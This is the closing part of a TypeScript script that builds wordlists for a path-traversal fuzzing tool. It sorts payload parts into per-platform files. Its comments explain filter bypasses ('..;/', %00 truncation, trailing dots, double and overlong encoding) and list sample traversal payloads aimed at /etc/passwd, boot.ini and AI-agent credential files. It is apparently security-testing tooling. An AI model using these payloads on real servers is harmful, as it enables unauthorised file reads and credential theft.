      : `${category}/target.txt`

  const TARGET_EXPLAIN: Record<Category, ReadonlyArray<string>> = {
    windows: [
      "Windows targets: drive-letter and UNC paths, the registry hives, IIS and",
      "inetpub, Program Files, and anything whose separators are backslashes.",
      "",
      "A path lands here when it CANNOT resolve anywhere else -- an OS-rooted path",
      "beats a stack marker, so C:\\xampp\\php\\php.ini is a Windows target and not a",
      "PHP one. See scripts/categorize.ts."
    ],
    macos: [
      "macOS targets: /System, /Library, /Users, /private, /Volumes, keychains,",
      "launchd plists and the Homebrew prefix.",
      "",
      "The public lists are thin here -- 25 harvested entries against 5,900 Windows",
      "ones -- so most of this file is the curated sections below."
    ],
    linux: [
      "Linux and UNIX targets: /etc, /proc, /var/log, /root, /home, shells, SSH.",
      "",
      "This is the residual category ON PURPOSE. A path identifying a STACK",
      "component goes to devops/ or language/ instead: /etc/nginx/nginx.conf is",
      "nginx, /etc/php/8.3/cli/php.ini is PHP, and /etc/passwd is just Linux. Most",
      "of the harvested bulk is the Debian package-config dump in",
      "LFI-etc-files-of-all-linux-packages.txt, which is exactly that residue."
    ],
    language: [
      "Runtime and framework targets for ONE language. Reach for the file that",
      "matches what recon says is executing the request.",
      "",
      "An OS-rooted path is NOT here: C:\\xampp\\php\\php.ini is in windows/ and",
      "/Volumes/.../php.ini is in macos/, because those paths only resolve on one",
      "OS. See scripts/categorize.ts."
    ],
    devops: [
      "Infrastructure targets: the files that identify a STACK COMPONENT rather than",
      "an operating system -- web servers and reverse proxies, application servers,",
      "containers and orchestration, infrastructure-as-code, CI/CD, secrets and",
      "cloud credentials, data stores, service supervision.",
      "",
      "This is why /etc/nginx/nginx.conf is here and /etc/passwd is in linux/: the",
      "first one tells you what you are talking to, the second one does not.",
      "",
      "The AI-agent tooling section at the bottom is here for the same reason. An",
      ".mcp.json or a ~/.codex/auth.json identifies the build-and-deploy toolchain",
      "the way a docker-compose.yml does, and what it leaks is credentials for",
      "everything else."
    ]
  }

  // --- targets --------------------------------------------------------------
  let harvestedTargets = 0
  for (const value of harvestedOnly(targets)) {
    const { category, language } = classifyTarget(value)
    const out = fileAt(
      targetFile(category, language),
      category === "language" ? `${language} target dimension` : `${category} target dimension`,
      category === "language" ? TARGET_EXPLAIN.language : TARGET_EXPLAIN[category]
    )
    put(out, undefined, value, targets.get(value)!)
    harvestedTargets += 1
  }

  // Curated sections go where the section says, whole, header intact. A curated
  // value the harvest already found is skipped rather than written twice: the
  // five folders have to stay a partition.
  let curatedWritten = 0
  let curatedAlreadyHarvested = 0
  const curatedSeen = new Set<string>()
  for (const section of CURATED) {
    const out = fileAt(
      targetFile(section.category, section.language),
      section.category === "language"
        ? `${section.language} target dimension`
        : `${section.category} target dimension`,
      section.category === "language"
        ? TARGET_EXPLAIN.language
        : TARGET_EXPLAIN[section.category]
    )
    for (const entry of section.entries) {
      const from = targets.get(entry)
      if (from !== undefined && !(from.size === 1 && from.has("curated"))) {
        curatedAlreadyHarvested += 1
        continue
      }
      // ... and against the other curated sections, which overlap: two of them
      // both wanted /etc/docker/daemon.json.
      if (curatedSeen.has(entry)) {
        curatedAlreadyHarvested += 1
        continue
      }
      curatedSeen.add(entry)
      put(out, section.title, entry, ["curated"])
      curatedWritten += 1
    }
  }

  // --- traversal primitives -------------------------------------------------
  //
  // Separator identity is the ONLY dimension these differ in, so it is the only
  // split they get: a `\`-class step in any spelling is aimed at Win32 path
  // parsing, a `/`-class step at POSIX. The one exception is the semicolon
  // primitive, which is a servlet-container behaviour rather than a separator
  // respelling at all.
  const TRAVERSAL_EXPLAIN = [
    "Every primitive is in TRAILING-separator form, so prefix + traversal x repeat",
    "+ target concatenates without inserting anything.",
    "",
    "These primitives carry their OWN spelling. That is deliberately a second route",
    "to an encoding: '..%c0%af' here encodes only its own separator, whereas the",
    "'overlong_utf8' strategy rewrites every separator including the ones inside the",
    "target. Both payloads exist and they are not the same payload."
  ]
  for (const value of harvestedOnly(traversals)) {
    const file = value.includes(";")
      ? "language/traversal-java.txt"
      : separatorFamily(value) === "backslash"
      ? "windows/traversal.txt"
      : "linux/traversal.txt"
    const out = fileAt(
      file,
      file.startsWith("language/")
        ? "java traversal dimension"
        : `${file.split("/")[0]} traversal dimension`,
      file.startsWith("language/")
        ? [
          "The matrix-parameter traversal. A servlet container strips ';name=value'",
          "from a path segment AFTER the security constraint has been checked, so",
          "'..;/' is a '../' that the filter never saw. Tomcat, Jetty and anything",
          "proxied in front of them.",
          "",
          "The 'matrix_param' strategy is the generic form of this; the primitive is",
          "the form that encodes only its own separator."
        ]
        : [
          ...TRAVERSAL_EXPLAIN,
          "",
          file.startsWith("windows/")
            ? "Every step here carries a '\\'-class separator in some spelling, which is"
            : "Every step here is '/'-class only, in some spelling, which is",
          file.startsWith("windows/")
            ? "what makes it a Win32 payload."
            : "what makes it a POSIX payload."
        ]
    )
    put(out, undefined, value, traversals.get(value)!)
  }

  // --- prefixes -------------------------------------------------------------
  //
  // Hand-assigned, because 42 lines CAN be read and because a prefix carries
  // less of its own identity than a path does: '///////' is separator padding
  // and says nothing about anything.
  const DEVOPS_PREFIXES = new Set(["/cgi-bin/"])
  const PREFIX_EXPLAIN = [
    "A prefix sits in FRONT of the traversal: a document root, separator padding,",
    "a leading null byte, or a Win32 device/UNC prelude (\\\\.\\, //?/, \\\\localhost\\)."
  ]
  for (const value of harvestedOnly(prefixes)) {
    const file = DEVOPS_PREFIXES.has(value)
      ? "devops/prefix.txt"
      : separatorFamily(value) === "backslash" || /^[a-z]:/i.test(value)
      ? "windows/prefix.txt"
      : "linux/prefix.txt"
    const out = fileAt(file, `${file.split("/")[0]} prefix dimension`, [
      ...PREFIX_EXPLAIN,
      "",
      `${droppedLongPrefixes.size} harvested prefixes longer than ${MAX_PREFIX_LENGTH} bytes were dropped: they are`,
      "'AAAA...' and './././...' length-attack preludes, which the 'padding:N' stage",
      "generates from one integer instead of from one line per length.",
      "",
      file.startsWith("windows/")
        ? "Backslash-class padding, drive letters, and the Win32 device and UNC preludes."
        : file.startsWith("devops/")
        ? "Document roots a web server maps, rather than a filesystem root."
        : "Slash-class padding and the POSIX document roots. The two encoding-only" +
          " preludes %00 and %0a are here as well: a leading null or newline is not" +
          " platform-specific at all, and this is the folder the default config reads."
    ])
    put(out, undefined, value, prefixes.get(value)!)
  }
  for (const [value, file, title] of CURATED_PREFIXES) {
    if (prefixes.has(value)) continue
    const out = fileAt(file, `${file.split("/")[0]} prefix dimension`, PREFIX_EXPLAIN)
    put(out, title, value, ["curated"])
  }

  // --- suffixes -------------------------------------------------------------
  //
  // Two homes, and the split is a real one. A trailing dot or a run of dots is
  // Win32 stripping characters off the resolved name; everything else is a
  // truncation at the runtime or HTTP layer.
  const WINDOWS_SUFFIXES = /^\.+$/
  for (const value of harvestedOnly(suffixes)) {
    const windows = WINDOWS_SUFFIXES.test(value)
    const out = fileAt(
      windows ? "windows/suffix.txt" : "language/suffix.txt",
      windows ? "windows suffix dimension" : "runtime suffix dimension",
      windows
        ? [
          "Appended after the target. Win32 strips a trailing dot from the resolved",
          "name, so '/boot.ini.' opens '/boot.ini' while an extension check that ran",
          "earlier saw a different string.",
          "",
          "A trailing SPACE is missing on purpose: pt trims input lines, so it can",
          "only come from the 'trailing_space' strategy. Same for a single trailing",
          "dot, which 'trailing_dot' supplies -- the dot runs here are the forms the",
          "reference lists spell out."
        ]
        : [
          "Appended after the target to defeat an extension check or truncate the",
          "path. Grouped as 'language' because that is the layer the trick lives at:",
          "",
          "  %00, %00.png   a C string ends at the null; PHP < 5.3.4 is the classic,",
          "                 and any runtime handing a path to a C API can be one",
          "  ?.png          truncation at the query string, HTTP rather than runtime",
          "  ;.png          a servlet container strips ';...' from a path segment",
          "",
          "A trailing SPACE and a single trailing DOT are missing on purpose: pt trims",
          "input lines, so those two can only come from the 'trailing_space' and",
          "'trailing_dot' strategies."
        ]
    )
    put(out, undefined, value, suffixes.get(value)!)
  }

  // --- the verbatim passthrough --------------------------------------------
  //
  // Classified by the same rule as a target, because a raw entry IS a whole
  // payload: 'boot.ini' with backslash steps is a Windows payload, and
  // '.\\./.\\./..//etc/passwd' is a Linux target wearing Win32 noise.
  const RAW_EXPLAIN = [
    "Emitted VERBATIM: never decomposed, never rewritten, never repeat-multiplied.",
    "",
    "Every line here has a traversal whose steps are not a repetition of any single",
    "primitive, so no 'traversal x repeat' produces it. The canonical example is",
    "'%25%5c..%25%5c..%255cboot.ini': twelve steps end in '%25%5c' ('%' plus a",
    "single-encoded '\\\\') and the thirteenth ends in '%255c' (a properly",
    "double-encoded '\\\\'). Different tokens, so the entry is internally",
    "inconsistent and the generative model cannot reach it.",
    "",
    "What is NOT here any more is the doubled junction: '../../..//etc/passwd' is",
    "'../' x3 and a target of '//etc/passwd', because the leading-separator strip",
    "gives up exactly one separator. That shape was 251 of this file's former 398",
    "lines, and it was never internally inconsistent -- only inexpressible.",
    "",
    "This file is a CONSERVATIVE upper bound on what the model misses. Some lines",
    "here -- '.././.././../etc/./passwd', '..%2f../../etc/passwd' -- are shapes the",
    "STRATEGY layer reproduces (dot_noise, selective_first) even though the slot",
    "layer cannot. scripts/coverage-check.ts measures which."
  ]
  for (const value of raws.keys()) {
    const { category } = classifyTarget(value)
    const file = category === "windows" ? "windows/raw.txt" : "linux/raw.txt"
    const out = fileAt(file, `${file.split("/")[0]} verbatim passthrough`, RAW_EXPLAIN)
    put(out, undefined, value, raws.get(value)!)
  }

  // ---------------------------------------------------------------------------
  // Write
  // ---------------------------------------------------------------------------
  await fs.mkdir(outDir, { recursive: true })

  const sourceUrl = new Map(
    SOURCES.map((source) => [source.file, `${source.note}/${source.file} ${source.url}`])
  )

  const byLength = (a: string, b: string) => a.length - b.length || a.localeCompare(b)

  /** Lines in a section body, sorted, with the section's header above them. */
  const renderSection = (section: Section): Array<string> => {
    const body = [...section.values].sort(byLength)
    return section.title === undefined
      ? body
      : ["", `# --- ${section.title} ---`, ...body]
  }

  const written: Array<{ readonly file: string; readonly count: number }> = []

  for (const out of [...outFiles.values()].sort((a, b) => a.file.localeCompare(b.file))) {
    const lines = out.sections.flatMap(renderSection)
    // pt's own comment rule, not a naive /^#/: '#.png' is a PAYLOAD -- a '#'
    // truncates the URL at a fragment -- and counting it as a comment is how the
    // previous revision of this script under-reported suffix-full.txt by one.
    const count = lines.filter((line) => line.length > 0 && !isCommentLine(line)).length
    const sources = [...out.sources]
      .map((file) => sourceUrl.get(file) ?? file)
      .sort()
    const header = [
      `# pt ${out.what} -- ${count} entries`,
      `#`,
      `# Generated by scripts/harvest-wordlists.ts. Do not hand-edit; re-run instead.`,
      `# Lines are trimmed and '# ' comments dropped by pt, so a trailing space or a`,
      `# lone '#' CANNOT be expressed here -- those come from strategies.`,
      `#`,
      ...out.explain.map((line) => (line.length === 0 ? `#` : `# ${line}`)),
      `#`,
      `# Sources that contributed to THIS file:`,
      ...sources.map((line) => `#   ${line}`),
      `#`,
      ``
    ]
    const target = path.join(outDir, out.file)
    await fs.mkdir(path.dirname(target), { recursive: true })
    await fs.writeFile(target, header.join("\n") + lines.join("\n") + "\n", "utf8")
    written.push({ file: out.file, count })
    process.stderr.write(`  wrote ${out.file.padEnd(30)} ${count} entries\n`)
  }

  /**
   * A root-level file whose sources are the whole corpus: the two derived target
   * measurements. Same header shape, but the source list is every source.
   */
  const sourceSummary = SOURCES.map((source) => {
    const tally = tallies.get(source.file)!
    return `${source.note}/${source.file} (${tally.lines} lines) ${source.url}`
  })

  const write = async (
    file: string,
    what: string,
    values: ReadonlyArray<string>,
    extra: ReadonlyArray<string> = []
  ): Promise<void> => {
    const body = [...values].sort(byLength)
    await fs.writeFile(
      path.join(outDir, file),
      [
        `# pt ${what} -- ${body.length} entries`,
        `#`,
        `# Generated by scripts/harvest-wordlists.ts. Do not hand-edit; re-run instead.`,
        `# Lines are trimmed and '# ' comments dropped by pt, so a trailing space or a`,
        `# lone '#' CANNOT be expressed here -- those come from strategies.`,
        `#`,
        ...extra.map((line) => (line.length === 0 ? `#` : `# ${line}`)),
        `#`,
        `# Sources:`,
        ...sourceSummary.map((line) => `#   ${line}`),
        `#`,
        ``
      ].join("\n") + body.join("\n") + "\n",
      "utf8"
    )
    process.stderr.write(`  wrote ${file.padEnd(30)} ${body.length} entries\n`)
  }

  // Sizing files: small dimensions that the big ones get paired with. These stay
  // at the templates/ ROOT because they are cross-category by construction --
  // target-core.txt holds Windows, Linux and devops paths at once, and
  // pt-full.yml pairs it with every rewrite strategy.
  const plainFile = async (
    file: string,
    what: string,
    values: ReadonlyArray<string>,
    why: ReadonlyArray<string>
  ): Promise<void> => {
    await fs.writeFile(
      path.join(outDir, file),
      [
        `# pt ${what} -- ${values.length} entries`,
        `#`,
        `# Generated by scripts/harvest-wordlists.ts. Do not hand-edit; re-run instead.`,
        ...why.map((line) => `# ${line}`),
        `#`,
        ...values,
        ``
      ].join("\n"),
      "utf8"
    )
    process.stderr.write(`  wrote ${file.padEnd(30)} ${values.length} entries\n`)
  }

  await plainFile("empty.txt", "deliberately empty dimension", [], [
    "No entries. pt adds the empty member to prefix/traversal/suffix anyway, so",
    "naming this file in an override is how a strategy says 'this dimension off'.",
    "An override of '[]' is a config error, which is why a real file is needed.",
    "NOT valid for 'targets': targets are the one dimension with no empty member."
  ])
  await plainFile("traversal-min.txt", "minimal traversal pair", [...TRAVERSAL_MIN], [
    "Paired with the large target and suffix files. One spelling per platform is",
    "all a target needs to be reachable at all; variety comes from the blocks that",
    "pair the per-category traversal files with the small target list."
  ])
  await plainFile("traversal-core.txt", "common traversal primitives", [...TRAVERSAL_CORE], [
    "Covers the reference corpus's plain / semicolon / noise-slash / noise-dot",
    "classes without dragging in the other 177 primitives. Cross-category on",
    "purpose: both separator families, which is why it is not in a folder."
  ])
  await plainFile("target-core.txt", "high-value targets", [...TARGET_CORE], [
    "The files the strategy layer spells out in every encoding, and the only ones",
    "paired with the full prefix and traversal files.",
    "",
    "Measured, not guessed: the reference corpus pairs an encoded class with 23",
    "distinct targets and they are all classics. The 2026-era entries are included",
    "because they deserve the same encoding coverage.",
    "",
    "Cross-category on purpose -- Windows, Linux, PHP and devops paths together --",
    "which is why it lives at the templates/ root and not in a folder."
  ])
  await plainFile("target-padding.txt", "targets for padding:N", [...TARGET_PADDING], [
    "padding:2048 multiplies the length of every payload it touches, so it runs",
    "against three files at one depth rather than the whole matrix."
  ])
  await write(
    "target-encoded.txt",
    "targets the corpus respells",
    harvestedOnly(encodedTargets),
    [
      "Every target that the reference corpus writes with a RESPELLED separator --",
      "percent-encoded, double-encoded, overlong, fullwidth, %uXXXX, %%XX or base64.",
      "Derived mechanically by classesOf(), so it is a measurement of what the",
      "corpus actually asks to be encoded, not a guess.",
      "",
      "Stored in LITERAL spelling. The strategy supplies the encoding, so a target",
      "that still read '/etc%2fpasswd' would come out double-encoded.",
      "",
      "Cross-category by construction: a measurement over the whole corpus, so it",
      "stays at the templates/ root. pt-full.yml unions it with target-core.txt for",
      "every rewrite strategy."
    ]
  )
  await write(
    "target-hot.txt",
    "targets needing more than a bare path",
    harvestedOnly(hotTargets),
    [
      "Every target that the reference corpus pairs with something other than a bare",
      "absolute path -- a traversal, a null byte, a fake extension, a trailing dot.",
      "Derived mechanically from the corpus by classesOf(), so it is a measurement.",
      "",
      "This is the target list for the blocks that carry suffixes and traversals.",
      "The per-category target files are for the blocks that emit each target bare.",
      "Cross-category by construction, so it stays at the templates/ root."
    ]
  )

  // Reference corpus for the coverage checker: every non-comment source line,
  // concatenated. It goes next to the download cache rather than into
  // templates/, because it is 1.9 MB of verbatim third-party wordlist -- an
  // input to the checker, not a pt template, and not ours to vendor.
  const referencePath = path.join(sourceDir, "reference-corpus.txt")
  await fs.writeFile(
    referencePath,
    sourceLines.map(({ line }) => line).join("\n") + "\n",
    "utf8"
  )
  process.stderr.write(
    `  wrote ${path.relative(repoRoot, referencePath).padEnd(30)} ${sourceLines.length} entries (checker input)\n`
  )

  // ---------------------------------------------------------------------------
  // Report
  // ---------------------------------------------------------------------------
  const pad = (text: string, width: number) => text.padEnd(width)
  const num = (value: number, width = 7) => String(value).padStart(width)
  process.stdout.write(
    `\n${pad("source", 46)}${num("lines" as unknown as number, 7)}${num("cmt" as unknown as number, 6)}${
      num("dec" as unknown as number, 7)
    }${num("raw" as unknown as number, 6)}${num("drop" as unknown as number, 6)}\n`
  )
  const totals = emptyTally()
  for (const source of SOURCES) {
    const tally = tallies.get(source.file)!
    const dropped = Object.values(tally.discarded).reduce((a, b) => a + b, 0)
    process.stdout.write(
      `${pad(source.file.slice(0, 45), 46)}${num(tally.lines)}${num(tally.comments, 6)}${
        num(tally.decomposed)
      }${num(tally.raw, 6)}${num(dropped, 6)}\n`
    )
    totals.lines += tally.lines
    totals.comments += tally.comments
    totals.decomposed += tally.decomposed
    totals.raw += tally.raw
    for (const [key, value] of Object.entries(tally.discarded)) {
      totals.discarded[key] = (totals.discarded[key] ?? 0) + value
    }
  }
  const totalDropped = Object.values(totals.discarded).reduce((a, b) => a + b, 0)
  process.stdout.write(
    `${pad("TOTAL", 46)}${num(totals.lines)}${num(totals.comments, 6)}${
      num(totals.decomposed)
    }${num(totals.raw, 6)}${num(totalDropped, 6)}\n`
  )
  process.stdout.write(`\ndiscarded by reason:\n`)
  for (const [key, value] of Object.entries(totals.discarded).sort((a, b) => b[1] - a[1])) {
    process.stdout.write(`  ${pad(key, 32)}${num(value)}\n`)
  }
  // --- the accounting that proves the split lost nothing --------------------
  //
  // Per DIMENSION: how many deduplicated values the harvest produced, and how
  // many lines the category files actually contain. The two numbers have to
  // match, because the five folders are a partition.
  const dimensionOf = (file: string): string => {
    const base = path.basename(file, ".txt")
    if (base.startsWith("target")) return "target"
    if (base.startsWith("traversal")) return "traversal"
    if (base.startsWith("prefix")) return "prefix"
    if (base.startsWith("suffix")) return "suffix"
    return "raw"
  }
  const curatedPrefixCount = CURATED_PREFIXES.filter(([value]) => !prefixes.has(value)).length
  const expected: ReadonlyArray<readonly [string, number, string]> = [
    ["target", harvestedTargets + curatedWritten, `${harvestedTargets} harvested + ${curatedWritten} curated`],
    ["traversal", traversals.size, "harvested"],
    ["prefix", prefixes.size + curatedPrefixCount, `${prefixes.size} harvested + ${curatedPrefixCount} curated`],
    ["suffix", suffixes.size, "harvested"],
    ["raw", raws.size, "harvested"]
  ]
  process.stdout.write(`\ndimension accounting (deduplicated values vs lines written):\n`)
  process.stdout.write(
    `  ${pad("dimension", 12)}${pad("expected", 10)}${pad("written", 9)}  files\n`
  )
  let mismatch = false
  for (const [dimension, count, how] of expected) {
    const files = written.filter((entry) => dimensionOf(entry.file) === dimension)
    const total = files.reduce((sum, entry) => sum + entry.count, 0)
    if (total !== count) mismatch = true
    process.stdout.write(
      `  ${pad(dimension, 12)}${pad(`${count}`, 10)}${pad(`${total}`, 9)}${
        total === count ? "  " : " !"
      } ${files.map((entry) => `${entry.file}(${entry.count})`).join(" ")}   [${how}]\n`
    )
  }
  process.stdout.write(
    `\n  ${curatedAlreadyHarvested} curated target entries were skipped as already harvested.\n`
  )
  if (mismatch) {
    process.stderr.write(
      `\nharvest: a dimension's written lines do not match its value count -- the split DROPPED or DUPLICATED something.\n`
    )
    process.exitCode = 1
  }
}

await main()
